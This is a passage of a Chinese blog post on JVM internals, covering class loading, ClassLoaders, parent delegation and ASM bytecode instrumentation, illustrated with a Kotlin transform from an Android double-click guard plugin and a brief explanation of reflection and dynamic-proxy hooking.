class=\"token function\">InsnList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">VarInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>ALOAD<span class=\"token punctuation\">,</span> <span class=\"token function\">getVisitPosition</span><span class=\"token punctuation\">(</span>\n                                            argumentTypes<span class=\"token punctuation\">,</span>\n                                            viewArgumentIndex<span class=\"token punctuation\">,</span>\n                                            methodNode<span class=\"token punctuation\">.</span>isStatic\n                                        <span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">MethodInsnNode</span><span class=\"token punctuation\">(</span>\n                                        Opcodes<span class=\"token punctuation\">.</span>INVOKESTATIC<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>formatDoubleCheckClass<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodName<span class=\"token punctuation\">,</span>\n                                        config<span class=\"token punctuation\">.</span>doubleCheckMethodDescriptor\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span>\n                                <span class=\"token keyword\">val</span> labelNode <span class=\"token operator\">=</span> <span class=\"token function\">LabelNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">JumpInsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>IFNE<span class=\"token punctuation\">,</span> labelNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">InsnNode</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>labelNode<span class=\"token punctuation\">)</span>\n                                instructions<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">}</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n                classNode<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> byteArray\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ClassNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">,</span> methodNode<span class=\"token operator\">:</span> MethodNode<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> myInterfaces <span class=\"token operator\">=</span> interfaces\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">val</span> extraHookMethodList <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList\n        extraHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myInterfaces<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">.</span>interfaceName<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc <span class=\"token operator\">==</span> it<span class=\"token punctuation\">.</span>methodSign<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>InvokeDynamicInsnNode<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> onClickListenerLambda <span class=\"token operator\">=</span> findLambda <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> nodeName <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>name\n            <span class=\"token keyword\">val</span> nodeDesc <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>desc\n            <span class=\"token keyword\">val</span> find <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>hookPointList<span class=\"token punctuation\">.</span><span class=\"token function\">find</span> <span class=\"token punctuation\">{</span> point <span class=\"token operator\">-&gt;</span>\n                nodeName <span class=\"token operator\">==</span> point<span class=\"token punctuation\">.</span>methodName <span class=\"token operator\">&amp;&amp;</span> nodeDesc<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span>point<span class=\"token punctuation\">.</span>interfaceSignSuffix<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">return</span><span class=\"token label symbol\">@findLambda</span> find <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> onClickListenerLambda\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getInputTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Set<span class=\"token operator\">&lt;</span>QualifiedContent<span class=\"token punctuation\">.</span>ContentType<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> TransformManager<span class=\"token punctuation\">.</span>CONTENT_CLASS\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getScopes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MutableSet<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">mutableSetOf</span><span class=\"token punctuation\">(</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>PROJECT<span class=\"token punctuation\">,</span>\n            QualifiedContent<span class=\"token punctuation\">.</span>Scope<span class=\"token punctuation\">.</span>SUB_PROJECTS<span class=\"token punctuation\">,</span>\n<span class=\"token comment\">//            QualifiedContent.Scope.EXTERNAL_LIBRARIES</span>\n        <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>他自己封装了一个<code>BaseTransform</code>，把修改class的过程封装成了一个<code>modifierClass(byteArray: ByteArray): ByteArray</code>方法，让我们能更专注于修改类信息的过程。至于他是怎么封装的也可以课下了解，这里我们着重讲他如何使用asm。</p>\n<p>我们首先分析他的逻辑，无外乎两点：</p>\n<ul>\n<li>找到hook点（ButterKnife的onClick注解，View#setOnClickListener）</li>\n<li>在hook点插入逻辑代码</li>\n</ul>\n<blockquote>\n<p>这里自由发挥吧，随便讲点就差不多了。</p>\n</blockquote>\n<h2 id=\"虚拟机类加载机制\"><a href=\"#虚拟机类加载机制\" class=\"headerlink\" title=\"虚拟机类加载机制\"></a>虚拟机类加载机制</h2><p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp\" alt=\"13202633-3cb11d1712a9efc9\"></p>\n<h3 id=\"类的生命周期\"><a href=\"#类的生命周期\" class=\"headerlink\" title=\"类的生命周期\"></a>类的生命周期</h3><h4 id=\"加载-Loading\"><a href=\"#加载-Loading\" class=\"headerlink\" title=\"加载 Loading\"></a>加载 Loading</h4><blockquote>\n<p>虚拟机从io流读取类文件到内存中。</p>\n<p>加载过程主要完成三件事情：</p>\n<ol>\n<li>通过类的全限定名来获取定义此类的二进制字节流</li>\n<li>将这个类字节流代表的静态存储结构转为方法区的运行时数据结构</li>\n<li>在堆中生成一个代表此类的java.lang.Class对象，作为访问方法区这些数据结构的入口。</li>\n</ol>\n<p>这个过程主要就是类加载器完成。</p>\n</blockquote>\n<h4 id=\"验证-Verification\"><a href=\"#验证-Verification\" class=\"headerlink\" title=\"验证 Verification\"></a>验证 Verification</h4><blockquote>\n<p>此阶段主要确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机的自身安全。</p>\n<ol>\n<li>文件格式验证：基于字节流验证。</li>\n<li>元数据验证：基于<em><strong>方法区</strong></em>的存储结构验证。</li>\n<li>字节码验证：基于方法区的存储结构验证。</li>\n<li>符号引用验证：基于方法区的存储结构验证。</li>\n</ol>\n</blockquote>\n<h4 id=\"准备-Preparation\"><a href=\"#准备-Preparation\" class=\"headerlink\" title=\"准备 Preparation\"></a>准备 Preparation</h4><blockquote>\n<p>为类变量分配内存，并将其初始化为默认值。（此时为默认值，在初始化的时候才会给变量赋值）即在方法区中分配这些变量所使用的内存空间</p>\n</blockquote>\n<p>例如</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> value <span class=\"token operator\">=</span> <span class=\"token number\">12345</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>虽说value在代码中被初始化为5，但这时value的值仍然为0，变量要在初始化阶段才会被赋初值（如果有）。</p>\n<h4 id=\"解析-Resolution\"><a href=\"#解析-Resolution\" class=\"headerlink\" title=\"解析 Resolution\"></a>解析 Resolution</h4><blockquote>\n<p>把类型中的符号引用转换为直接引用。</p>\n<ul>\n<li>符号引用与虚拟机实现的布局无关，引用的目标并不一定要已经加载到内存中。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。</li>\n<li>直接引用可以是指向目标的指针，相对偏移量或是一个能间接定位到目标的句柄。如果有了直接引用，那引用的目标必定已经在内存中存在</li>\n</ul>\n<p>主要有以下四种：</p>\n<ul>\n<li><p>类或接口的解析</p>\n</li>\n<li><p>字段解析</p>\n</li>\n<li><p>类方法解析</p>\n</li>\n<li><p>接口方法解析</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"初始化-Initialization\"><a href=\"#初始化-Initialization\" class=\"headerlink\" title=\"初始化 Initialization\"></a>初始化 Initialization</h4><blockquote>\n<p>初始化阶段是执行类构造器<client>方法的过程。<client>方法是由编译器自动收集类中的类变量的赋值操作和静态语句块中的语句合并而成的。虚拟机会保证<client>方法执行之前，父类的<client>方法已经执行完毕。如果一个类中没有对静态变量赋值也没有静态语句块，那么编译器可以不为这个类生成<client>()方法。</client></client></client></client></client></p>\n<p>java中，对于初始化阶段，有且只有以下五种情况才会对要求类立刻“初始化”（加载，验证，准备，自然需要在此之前开始）：</p>\n<ul>\n<li><p>使用new关键字实例化对象、访问或者设置一个类的静态字段（被final修饰、编译器优化时已经放入常量池的例外）、调用类方法，都会初始化该静态字段或者静态方法所在的类。</p>\n</li>\n<li><p>初始化类的时候，如果其父类没有被初始化过，则要先触发其父类初始化。</p>\n</li>\n<li><p>使用java.lang.reflect包的方法进行反射调用的时候，如果类没有被初始化，则要先初始化。</p>\n</li>\n<li><p>虚拟机启动时，用户会先初始化要执行的主类（含有main）</p>\n</li>\n<li><p>jdk 1.7后，如果java.lang.invoke.MethodHandle的实例最后对应的解析结果是 REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄，并且这个方法所在类没有初始化，则先初始化。</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"卸载-Unloading\"><a href=\"#卸载-Unloading\" class=\"headerlink\" title=\"卸载 Unloading\"></a>卸载 Unloading</h4><blockquote>\n<p>在栈中不存在该类的实例与Class对象，且加载该类的classLoader失去gc roots时，换言之该类已经失去了gc roots，被gc回收，此时可以称作该类成功从jvm中卸载了，这条机制也是一些热修复方案的实现原理(其实现在大部分的热修复都是用JavaAgent实现类的热替换）。</p>\n</blockquote>\n<h3 id=\"类加载器-ClassLoader\"><a href=\"#类加载器-ClassLoader\" class=\"headerlink\" title=\"类加载器 (ClassLoader)\"></a>类加载器 (ClassLoader)</h3><h4 id=\"各司其职\"><a href=\"#各司其职\" class=\"headerlink\" title=\"各司其职\"></a>各司其职</h4><p>JVM 运行实例中会存在多个 ClassLoader，不同的 ClassLoader 会从不同的地方加载字节码文件。它可以从不同的文件目录加载，也可以从不同的 jar 文件中加载，也可以从网络上不同的服务地址来加载。</p>\n<p>JVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。</p>\n<p>BootstrapClassLoader 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 java.util.*、java.io.*、java.nio.<em>、java.lang.</em> 等等。这个 ClassLoader 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。</p>\n<p>ExtensionClassLoader 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。</p>\n<p>AppClassLoader 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。</p>\n<p>那些位于网络上静态文件服务器提供的 jar 包和 class文件，jdk 内置了一个 URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。</p>\n<p>AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，它就是我们所说的「系统类加载器」，我们用户平时编写的类代码通常都是由它加载的。当我们的 main 方法执行的时候，这第一个用户类的加载器就是 AppClassLoader。</p>\n<h4 id=\"ClassLoader-传递性\"><a href=\"#ClassLoader-传递性\" class=\"headerlink\" title=\"ClassLoader 传递性\"></a>ClassLoader 传递性</h4><p>程序在运行过程中，遇到了一个未知的类，它会选择哪个 ClassLoader 来加载它呢？虚拟机的策略是使用调用者 Class 对象的 ClassLoader 来加载当前未知的类。何为调用者 Class 对象？就是在遇到这个未知的类时，虚拟机肯定正在运行一个方法调用（静态方法或者实例方法），这个方法挂在哪个类上面，那这个类就是调用者 Class 对象。前面我们提到每个 Class 对象里面都有一个 classLoader 属性记录了当前的类是由谁来加载的。</p>\n<p>因为 ClassLoader 的传递性，所有延迟加载的类都会由初始调用 main 方法的这个 ClassLoader 全全负责，它就是 AppClassLoader。</p>\n<h4 id=\"双亲委派\"><a href=\"#双亲委派\" class=\"headerlink\" title=\"双亲委派\"></a>双亲委派</h4><p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p>\n<p>使用双亲委派模型的好处在于<strong>Java类随着它的类加载器一起具备了一种带有优先级的层次关系</strong>。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。</p>\n<p><img src=\"https://img-blog.csdn.net/20160506184936657\" alt=\"类加载器的双亲委派模型\"></p>\n<p><strong>双亲委派模型的系统实现</strong></p>\n<p>在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span><span class=\"token keyword\">boolean</span> resolve<span class=\"token punctuation\">)</span><span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//check the class has been loaded or not</span>\n    <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token function\">findLoadedClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>parent <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                c <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n                c <span class=\"token operator\">=</span> <span class=\"token function\">findBootstrapClassOrNull</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">//if throws the exception ,the father can not complete the load</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            c <span class=\"token operator\">=</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见《深入理解Java虚拟机》。</p>\n<h2 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h2><h3 id=\"什么是Hook\"><a href=\"#什么是Hook\" class=\"headerlink\" title=\"什么是Hook\"></a>什么是Hook</h3><p>hook我认为更像是一种思想，而非一门单独的技术，其实就是通过一些旁门左道去通过代理修改别人的代码来达成一些意想不到的功能。而通过这些旁门左道其实是没办法随心所欲的修改代码的，所以我们需要从某些地方入手，这些地方被称作<strong>hook点</strong>。</p>\n<h3 id=\"怎么实现Hook\"><a href=\"#怎么实现Hook\" class=\"headerlink\" title=\"怎么实现Hook\"></a>怎么实现Hook</h3><p><img src=\"https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg\" alt=\"img\"></p>\n<p>那我就讲讲最基础的反射/动态代理Hook吧。</p>\n<p>假如我们导入的外部库的网络请求部分有这么一段代码:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">object</span> ServiceHolder <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> apiService<span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token operator\">=</span> <span class=\"token function\">WebServiceRepository</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// WebServiceRepository</span>\n<span class=\"token keyword\">class</span> WebServiceRepository <span class=\"token operator\">:</span> IWebServiceRepository <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> BASE_URL <span class=\"token operator\">=</span> <span class=\"token string\">\"https://api.bifrost.kim\"</span>\n    \n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">getJsonData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Data <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// ...</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然而它的接口改了，我们需要修改一下请求的方式</p>\n<p>最简单的方法就是我们直接动态代理apiService，然后反射放进去。</p>\n<p>但InvocationHandler提供的动态代理也许不是很方便，只能在头部或者尾部插入逻辑。即便我们只需要修改部分字符串，就得重写整个网络请求方法的逻辑。</p>\n<p>那么更好的方法是什么呢，正是字节码插桩，我们使用字节码生成一个一样的类，再用asm稍微的修改这其中的部分逻辑即可。</p>\n<h3 id=\"利用LSposed实现全局Hook-有时间再研究\"><a href=\"#利用LSposed实现全局Hook-有时间再研究\" class=\"headerlink\" title=\"利用LSposed实现全局Hook (有时间再研究)\"></a>利用LSposed实现全局Hook (有时间再研究)</h3><blockquote>\n<p>有时间再说吧 我没研究（</p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"浅入浅出JVM-amp-Hook\"><a href=\"#浅入浅出JVM-amp-Hook\" class=\"headerlink\" title=\"浅入浅出JVM &amp; Hook\"></a>浅入浅出JVM &amp; Hook</h1><blockquote>\n<p>其中混杂有相当多的个人理解，如有谬误烦请学长指正</p>\n</blockquote>\n<h2 id=\"什么是JVM\"><a href=\"#什么是JVM\" class=\"headerlink\" title=\"什么是JVM\"></a>什么是JVM</h2><p><strong>Java Virtual Machine</strong>，即Java虚拟机。那么虚拟机又是什么？</p>\n<blockquote>\n<p>虚拟机（Virtual Machine）指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</p>\n</blockquote>\n<p>但不同于其他虚拟机的是，JVM模拟的是一个无法直接在硬件设备上安装的计算机系统——究其根本，它就是一个在各个系统中具有基本相同行为的<strong>跨平台程序</strong>，它提供了一系列可供Java语言调用的API，而这些API都可以溯源到<strong>本地方法</strong>(也就是native修饰的方法)。这些方法在native语言层面实现，且在不同的系统上有着不同逻辑的实现。但抽象到java语言层面，它们的作用是一致的。</p>\n<p>就这样，JVM为我们在各个系统提供了一个具有统一“系统“的虚拟机环境，我们不需要让外部的实际系统认识我们的编译出来的软件，我们只需要让JVM认识它就可以了。每当我们使用<code>java -jar</code>命令运行一个jar文件, 实际上都先运行了JVM，再由JVM来<strong>运行时</strong>的解释并加载jar包中的类文件，并通过META-INF中的主类信息找到主类并执行其中的main方法。</p>\n<p>因此，我们使用Java等依赖于JVM的语言编写程序时如果只调用Java语言为我们提供的API，我们编写的代码就可以在一切支持JVM的系统上运行。正所谓 <em><strong>Write once, run anywhere</strong></em>。你会发现很多直接编译为native的语言(C, C++, Rust, Go…)甚至需要在对应的系统编译才能运行，这也正是JVM系语言相对于其他语言的优势之一。</p>\n<h2 id=\"JVM的种类\"><a href=\"#JVM的种类\" class=\"headerlink\" title=\"JVM的种类\"></a>JVM的种类</h2><p>这里介绍主要的几种</p>\n<h3 id=\"Sun-Classic-VM\"><a href=\"#Sun-Classic-VM\" class=\"headerlink\" title=\"Sun Classic VM\"></a>Sun Classic VM</h3><blockquote>\n<p>万物伊始</p>\n</blockquote>\n<p>其中使用的技术在今天看来已经相当原始，这款虚拟机的使命也早已终结，但凭它”世界上第一款商用Java虚拟机“的头衔，便足以让它被历史铭记。</p>\n<h3 id=\"HotSpot-VM\"><a href=\"#HotSpot-VM\" class=\"headerlink\" title=\"HotSpot VM\"></a>HotSpot VM</h3><blockquote>\n<p>武林盟主</p>\n</blockquote>\n<p>毫无疑问是当今被最广泛使用的Java虚拟机</p>\n<h3 id=\"Graal-VM\"><a href=\"#Graal-VM\" class=\"headerlink\" title=\"Graal VM\"></a>Graal VM</h3><blockquote>\n<p>明日之星</p>\n</blockquote>\n<p>创造性的将字节码编译为另一种中间媒介，同时支持将其他语言编译为这种中间媒介，实现多语言之间的相互调用，JVM将不再专属于字节码。举个例子，我们甚至可以在Java中使用Node.js的Express框架来开发后端程序。</p>\n<h3 